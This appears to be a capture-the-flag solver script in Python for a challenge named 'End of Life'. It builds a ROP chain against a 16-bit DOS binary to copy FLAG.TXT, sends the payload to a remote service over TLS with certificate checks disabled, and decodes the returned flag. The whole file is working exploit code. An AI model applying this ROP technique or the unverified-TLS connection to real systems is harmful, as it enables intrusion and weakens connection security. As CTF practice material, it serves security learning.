        "code": "#!/usr/bin/env python3\nimport argparse\nimport base64\nimport os\nimport re\nimport socket\nimport ssl\nimport subprocess\nimport sys\nfrom pathlib import Path\nfrom struct import pack\n\nBASE_DIR = Path(__file__).resolve().parent\n\n# Code addresses from CHALL.EXE (Borland C++ 3.0, 16-bit DOS)\nOPEN   = 0x1CF3  # _open(path, flags) -> DOS int 21h AH=3Dh\nCREAT  = 0x1B7C  # creat(attr, path), ret 4\nREAD   = 0x05ED  # read(handle, buf, len)\nWRITE  = 0x2366  # write(handle, buf, len)\nCLOSE  = 0x158A  # close(handle)\nEXIT   = 0x0197  # int 21h AH=4Ch\n\n# ROP cleanup gadgets\nCLEAN2 = 0x0D97  # pop cx ; pop bx ; ret\nCLEAN3 = 0x0D96  # pop dx ; pop cx ; pop bx ; ret\nCLEAN1 = 0x0D98  # pop bx ; ret\n\n# DGROUP offsets\nOUT_TXT = 0x00C4\nFLAG_TXT = 0x0028\nBUF = 0x0121\nNREAD = 0x0100\n\n\ndef w(x: int) -> bytes:\n    return pack(\"<H\", x & 0xFFFF)\n\n\ndef build_payload() -> bytes:\n    p = bytearray(b\"a\\x1a\" + b\"B\" * 16)\n    p += w(0x4242)\n    p += w(OPEN)\n\n    p += w(CLEAN2) + w(FLAG_TXT) + w(0x0000)\n\n    p += w(CREAT) + w(READ) + w(0x0000) + w(OUT_TXT)\n\n    p += w(CLEAN3) + w(0x0005) + w(BUF) + w(NREAD)\n\n    p += w(WRITE) + w(CLEAN3) + w(0x0006) + w(BUF) + w(NREAD)\n\n    p += w(CLOSE) + w(CLEAN1) + w(0x0006) + w(EXIT)\n\n    if len(p) > 72:\n        raise RuntimeError(f\"ROP chain too long before FLAG.TXT slot: {len(p)}\")\n\n    p += b\"C\" * (72 - len(p))\n    p += b\"FLAG.TXT\\x00\"\n\n    bad = [i for i, b in enumerate(p) if b == 0x20]\n    if bad:\n        raise RuntimeError(f\"payload contains spaces at offsets {bad}\")\n\n    return bytes(p)\n\n\ndef extract_output(text: bytes) -> bytes:\n    m = re.search(rb\"Your OUTPUT\\.TXT:\\s*([A-Za-z0-9+/=]+)\", text)\n    if not m:\n        return b\"\"\n\n    try:\n        return base64.b64decode(m.group(1))\n    except Exception:\n        return b\"\"\n\n\ndef show_result(raw: bytes) -> None:\n    decoded = extract_output(raw)\n\n    sys.stdout.buffer.write(raw)\n    if raw and not raw.endswith(b\"\\n\"):\n        print()\n\n    if decoded:\n        print(\"\\n[+] Decoded OUTPUT.TXT:\")\n        sys.stdout.buffer.write(decoded + (b\"\\n\" if not decoded.endswith(b\"\\n\") else b\"\"))\n\n        m = re.search(rb\"[A-Za-z0-9_]+\\{[^}\\r\\n]{1,200}\\}\", decoded)\n        if m:\n            print(f\"\\n<FLAG>{m.group(0).decode(errors='replace')}</FLAG>\")\n\n\ndef run_remote(host: str, port: int, payload: bytes, use_ssl: bool = True) -> None:\n    b64 = base64.b64encode(payload) + b\"\\n\"\n    data = b\"\"\n\n    raw = socket.create_connection((host, port), timeout=10)\n    raw.settimeout(10)\n\n    if use_ssl:\n        # CTF biasanya pakai TLS/self-signed cert.\n        # Jadi SNI tetap dikirim, tapi verifikasi sertifikat dimatikan.\n        ctx = ssl._create_unverified_context()\n        s = ctx.wrap_socket(raw, server_hostname=host)\n    else:\n        s = raw\n\n    with s:\n        try:\n            while b\"base64\" not in data.lower() and not data.endswith(b\": \"):\n                chunk = s.recv(4096)\n                if not chunk:\n                    break\n                data += chunk\n        except socket.timeout:\n            pass\n\n        s.sendall(b64)\n\n        while True:\n            try:\n                chunk = s.recv(4096)\n            except socket.timeout:\n                break\n\n            if not chunk:\n                break\n\n            data += chunk\n\n    show_result(data)\n\n\ndef run_local(payload: bytes) -> None:\n    server = BASE_DIR / \"server.py\"\n\n    if not server.exists():\n        print(base64.b64encode(payload).decode())\n        return\n\n    try:\n        p = subprocess.Popen(\n            [sys.executable, str(server)],\n            cwd=str(BASE_DIR),\n            stdin=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.STDOUT,\n        )\n\n        out, _ = p.communicate(base64.b64encode(payload) + b\"\\n\", timeout=15)\n        show_result(out)\n\n    except Exception as e:\n        print(f\"[!] Local run failed: {e}\")\n        print(\"[+] Payload base64:\")\n        print(base64.b64encode(payload).decode())\n\n\ndef parse_kv(argv):\n    out = {}\n    rest = []\n\n    for a in argv:\n        if \"=\" in a:\n            k, v = a.split(\"=\", 1)\n            out[k.upper()] = v\n        else:\n            rest.append(a)\n\n    return out, rest\n\n\ndef main() -> None:\n    kv, rest = parse_kv(sys.argv[1:])\n\n    ap = argparse.ArgumentParser(description=\"Solver for End of Life\")\n    ap.add_argument(\"mode\", nargs=\"?\", default=\"LOCAL\", choices=[\"LOCAL\", \"REMOTE\", \"PAYLOAD\"])\n    ap.add_argument(\"--host\", default=kv.get(\"HOST\"))\n    ap.add_argument(\"--port\", type=int, default=int(kv[\"PORT\"]) if \"PORT\" in kv else None)\n    ap.add_argument(\n        \"--no-ssl\",\n        action=\"store_true\",\n        default=(kv.get(\"SSL\", \"1\").lower() in {\"0\", \"false\", \"no\", \"plain\"}),\n    )\n\n    args = ap.parse_args(rest)\n\n    payload = build_payload()\n\n    if args.mode == \"PAYLOAD\":\n        print(base64.b64encode(payload).decode())\n\n    elif args.mode == \"REMOTE\":\n        if not args.host or not args.port:\n            raise SystemExit(\"Usage: python3 solve.py REMOTE HOST=<host> PORT=<port>\")\n\n        run_remote(args.host, args.port, payload, use_ssl=not args.no_ssl)\n\n    else:\n        run_local(payload)\n\n\nif __name__ == \"__main__\":\n    main()"
